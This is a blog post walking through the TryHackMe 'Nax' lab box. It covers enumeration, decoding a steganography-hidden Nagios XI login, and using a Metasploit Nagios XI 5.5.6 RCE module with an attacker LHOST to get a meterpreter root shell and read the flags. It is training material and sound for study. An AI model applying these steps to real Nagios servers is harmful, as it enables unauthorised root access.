<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Nax is a medium difficulty box on TryHackMe. Below is a step by step walkthrough to root this box.
Let&rsquo;s start by running nmap -A [machine ip]. We end up with the following results.
It looks like there&rsquo;s sites running both on http and https, let&rsquo;s take a look at both of them to see what&rsquo;s going on. Both sites show the same page as shown below.
However, a review of the source code reveals a comment with a possible subdirectory to look at."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" Nax - TryHackMe"><meta name=twitter:description content="Nax is a medium difficulty box on TryHackMe. Below is a step by step walkthrough to root this box.
Let&rsquo;s start by running nmap -A [machine ip]. We end up with the following results.
It looks like there&rsquo;s sites running both on http and https, let&rsquo;s take a look at both of them to see what&rsquo;s going on. Both sites show the same page as shown below.
However, a review of the source code reveals a comment with a possible subdirectory to look at."><meta property="og:title" content=" Nax - TryHackMe"><meta property="og:description" content="Nax is a medium difficulty box on TryHackMe. Below is a step by step walkthrough to root this box.
Let&rsquo;s start by running nmap -A [machine ip]. We end up with the following results.
It looks like there&rsquo;s sites running both on http and https, let&rsquo;s take a look at both of them to see what&rsquo;s going on. Both sites show the same page as shown below.
However, a review of the source code reveals a comment with a possible subdirectory to look at."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-17-nax/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-17T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-17T00:00:00+00:00"><title>Nax - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-17-nax/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a2eeff1d223fbc3bb6ff964c9089232ebb9cc98ec98ad5e666e532eccccce7b6.css integrity="sha256-ou7/HSI/vDu2/5ZMkIkjLrucyY7JitXmZuUy7MzM57Y=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-17-nax/>Nax - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-17T00:00:00Z>July 17, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/nax/>Nax</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/steganography/>steganography</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/metasploit/>metasploit</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/nagios/>Nagios</a></span></div></div></header><div><p>Nax is a medium difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below is a step by step walkthrough to root this box.</p><p>Let&rsquo;s start by running <strong>nmap -A [machine ip]</strong>. We end up with the following results.</p><p><img src=/assets/img/Nax1.png alt="Nax nmap"></p><p>It looks like there&rsquo;s sites running both on http and https, let&rsquo;s take a look at both of them to see what&rsquo;s going on. Both sites show the same page as shown below.</p><p><img src=/assets/img/Nax2.png alt="Nax Website"></p><p>However, a review of the source code reveals a comment with a possible subdirectory to look at.</p><p><img src=/assets/img/Nax3.png alt="Nax website source"></p><p>Let&rsquo;s visit <strong>http://[machine ip]/nagiosxi</strong>. This leads to a login page for Nagios XI.</p><p><img src=/assets/img/Nax4.png alt="Nax Nagios Login"></p><p>At this point, we do not have any credentials, so let&rsquo;s use gobuster to try to enumerate and try to find some files/other directories. Let&rsquo;s run <strong>gobuster dir -u http://[machine ip]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,xls -t 50</strong>. Unfortunately, this did not turn up anything. At this point I turned my attention back to the list of elements on the main page.</p><p>After a quick Google search, I found a <a href=https://www.dcode.fr/atomic-number-substitution>Periodic Table Cipher</a>. Converting the periodic elements (Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr) to their respective element numbers gives us **47 80 73 51 84 46 80 78 103 **.</p><p><img src=/assets/img/Nax5.png alt="Nax Periodic Table Cipher"></p><p>Next, let&rsquo;s convert these numbers to their respective entries on an ASCII table. I used <a href=https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html>RapidTables</a> for this. This gets us the answer to <strong>Question 1</strong>.</p><p><img src=/assets/img/Nax6.png alt="Nax Question 1"></p><p>Visiting the answer to Question 1 gets us an image that I saved and downloaded.</p><p>Running <strong>exiftool [image name]</strong> (redacted due to it answering Question 1) gives us the answer to <strong>Question 2</strong>.</p><p><img src=/assets/img/Nax8.png alt="Nax Question 2"></p><p>At this point, it seemed pretty obvious that this was using some sort of steganography, but I wasn&rsquo;t sure what type was being used to be honest. I searched for the answer to Question 2 in Google followed by the word cryptography, which led me to a Reddit thread which had a link to an online decoder. I imported the picture and it was able to find a payload hidden within the image.</p><p><img src=/assets/img/Nax9.png alt="Nax image decode"></p><p>This ends up providing you with the Nagios credentials, which end up being the answers to <strong>Question 3</strong> and <strong>Question 4</strong>. At this point, I went and attempted to use these newfound credentials to login to Nagios at <strong>http://[machine ip]/nagiosxi/</strong> I was able to login successfully.</p><p><img src=/assets/img/Nax10.png alt="Nax Nagios Login"></p><p>The next question asked for the CVE number, so I Googled <strong>CVE Nagios XI 5.5.6</strong>. There were several vulnerabilities out there, but the CVE ended up being one from 2019 that allows code execution as root. This is the answer to <strong>Question 5</strong>.</p><p><strong>Question 6</strong> has no answer to submit, as it wants you to start MetaSploit, so go ahead and do so.</p><p><strong>Question 7</strong> asks you for the module name of the machine, using <strong>search Nagios 5.5.6</strong> once logged into will provide you with some modules, one of which is the answer to this question.</p><p>Once you have select this module, use <strong>SET PASSWORD</strong> and set the appropriate password and <strong>SET LHOST [attacker ip address]</strong>. Once done, it should look similar to the following.</p><p><img src=/assets/img/Nax11.png alt="Nax Metasploit"></p><p>Once reviewed, type <strong>run</strong> to run the exploit. You should have a meterpreter shell within a few moments. Next, type <strong>shell</strong> to get a local shell and run <strong>whoami</strong> and you will see you are root.</p><p><img src=/assets/img/Nax12.png alt="Nax root shell"></p><p>I next ran <strong>ls /home</strong> to enumerate nonroot users to find the user flag. There is a user <strong>galand</strong> here. If we run <strong>ls /home/galand</strong> we will see the user.txt file. This can be read with <strong>cat /home/galand/user.txt</strong>, the answer to <strong>Question 8</strong>.</p><p><img src=/assets/img/Nax13.png alt="Nax user.txt"></p><p>Next, let&rsquo;s run <strong>cat /root/root.txt</strong>, which is the usual default location for root flags.</p><p><img src=/assets/img/Nax14.png alt="Nax root.txt"></p><p>And we&rsquo;re all done with this box.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>